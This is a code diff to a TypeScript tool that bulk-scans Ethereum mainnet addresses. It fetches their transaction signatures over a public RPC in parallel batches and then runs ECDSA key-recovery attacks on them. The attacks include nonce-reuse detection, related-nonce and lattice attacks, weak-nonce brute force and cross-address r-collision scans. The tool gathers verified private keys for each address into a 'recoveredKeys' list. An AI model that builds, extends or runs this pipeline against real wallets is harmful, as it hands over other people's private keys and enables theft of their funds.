@@ -25,6 +25,15 @@ import {
   recoverPrivateKey,
   NonceReusePair,
 } from "./nonce-recovery";
+import {
+  detectCrossAddressRCollisions,
+  detectExactDuplicates,
+  relatedNonceAttack,
+  analyzeSignatureBias,
+  latticeAttack,
+  weakKBruteForce,
+  type AdvancedFinding,
+} from "./advanced-attacks";
 
 // ── RPC endpoint ──────────────────────────────────────────────────────────────
 const RPC_URL = "https://ethereum.publicnode.com";
@@ -126,18 +135,24 @@ interface RawRpcTx {
 }
 
 async function batchRpcGetTxs(hashes: string[]): Promise<(RawRpcTx | null)[]> {
-  const BATCH = 50;
+  const BATCH       = 50;   // txs per JSON-RPC batch request
+  const CONCURRENCY = 12;   // parallel in-flight HTTP requests
   const out: (RawRpcTx | null)[] = new Array(hashes.length).fill(null);
 
+  // Build all batch descriptors
+  const batches: Array<{ start: number; slice: string[] }> = [];
   for (let i = 0; i < hashes.length; i += BATCH) {
-    const slice   = hashes.slice(i, i + BATCH);
-    const payload = slice.map((h, idx) => ({
+    batches.push({ start: i, slice: hashes.slice(i, i + BATCH) });
+  }
+
+  // Process with bounded concurrency
+  async function doOne(b: { start: number; slice: string[] }): Promise<void> {
+    const payload = b.slice.map((h, idx) => ({
       jsonrpc: "2.0",
       method:  "eth_getTransactionByHash",
       params:  [h],
-      id:      i + idx,
+      id:      b.start + idx,
     }));
-
     try {
       const res  = await fetch(RPC_URL, {
         method:  "POST",
@@ -147,14 +162,25 @@ async function batchRpcGetTxs(hashes: string[]): Promise<(RawRpcTx | null)[]> {
       });
       const data = await res.json() as Array<{ id: number; result: RawRpcTx | null }>;
       for (const item of data) {
-        const localIdx = item.id - i;
-        if (localIdx >= 0 && localIdx < slice.length) {
-          out[i + localIdx] = item.result ?? null;
+        const localIdx = item.id - b.start;
+        if (localIdx >= 0 && localIdx < b.slice.length) {
+          out[b.start + localIdx] = item.result ?? null;
         }
       }
     } catch (err) {
-      logger.warn({ err, batchStart: i }, "Batch RPC error — continuing");
+      logger.warn({ err, batchStart: b.start }, "Batch RPC error — continuing");
     }
+  }
+
+  // Sliding-window concurrency
+  let idx = 0;
+  const active = new Set<Promise<void>>();
+  while (idx < batches.length || active.size > 0) {
+    while (active.size < CONCURRENCY && idx < batches.length) {
+      const p = doOne(batches[idx++]).then(() => active.delete(p));
+      active.add(p);
+    }
+    if (active.size > 0) await Promise.race(active);
   }
 
   return out;
@@ -305,8 +331,9 @@ export async function bulkScanViaBigQuery(
   }
   logger.info({ sigsExtracted: sigByHash.size, total: allHashes.length }, "Batch RPC complete");
 
-  // 5. Per-address: collect sigs, detect nonce reuse
+  // 5. Per-address: collect sigs, detect nonce reuse + advanced attacks
   const results: WalletScanResult[] = [];
+  const sigsByAddress = new Map<string, TxSignatureData[]>();
   let done = 0;
 
   for (const address of addresses) {
@@ -315,21 +342,58 @@ export async function bulkScanViaBigQuery(
     const sigs    = hashes.map(h => sigByHash.get(h.toLowerCase())).filter(Boolean) as TxSignatureData[];
     const pairs   = detectNonceReuse(lc, sigs);
 
+    if (sigs.length > 0) sigsByAddress.set(lc, sigs);
+
+    // Per-address advanced attacks
+    const adv: AdvancedFinding[] = [];
+    if (sigs.length > 0) {
+      adv.push(...detectExactDuplicates(new Map([[lc, sigs]])));
+      adv.push(...relatedNonceAttack(lc, sigs));
+      const bias = analyzeSignatureBias(lc, sigs);
+      adv.push(...bias.findings);
+      if (bias.shouldTriggerLattice) adv.push(...latticeAttack(lc, sigs, bias));
+      if (bias.smallRCount > 0 || sigs.length <= 200) adv.push(...weakKBruteForce(lc, sigs));
+    }
+
+    const recoveredKeys = [...new Set(adv.filter(f => f.privateKey && f.verified).map(f => f.privateKey!))];
+
     results.push({
       address:             address,
       chain:               "ethereum",
       totalTransactions:   hashes.length,
       signaturesExtracted: sigs.length,
       nonceReusePairs:     pairs,
-      hasVulnerability:    pairs.length > 0,
+      hasVulnerability:    pairs.length > 0 || recoveredKeys.length > 0,
       allSignatures:       sigs,
       scanTimestamp:       new Date().toISOString(),
       rPairs:              Object.fromEntries(
         pairs.map(p => [p.sharedR, [p.tx1.txHash, p.tx2.txHash]])
       ),
+      advancedFindings: adv,
+      recoveredKeys,
     });
 
     onProgress?.(++done, addresses.length);
+  }
+
+  // 6. CROSS-ADDRESS r COLLISION SCAN — runs across all collected signatures
+  if (sigsByAddress.size > 1) {
+    logger.info({ addressCount: sigsByAddress.size, totalSigs: [...sigsByAddress.values()].reduce((s, v) => s + v.length, 0) },
+      "Running cross-address r collision scan…");
+    const crossFindings = detectCrossAddressRCollisions(sigsByAddress);
+    if (crossFindings.length > 0) {
+      logger.warn({ count: crossFindings.length }, "⚠️  Cross-address r collisions detected");
+      // Attach findings to the affected addresses
+      for (const f of crossFindings) {
+        const r = results.find(res => res.address.toLowerCase() === f.address.toLowerCase());
+        if (r) {
+          (r.advancedFindings ??= []).push(f);
+          if (f.privateKey && f.verified) (r.recoveredKeys ??= []).push(f.privateKey);
+        }
+      }
+    } else {
+      logger.info("Cross-address scan: no r collisions across different addresses");
+    }
   }
 
   return results;
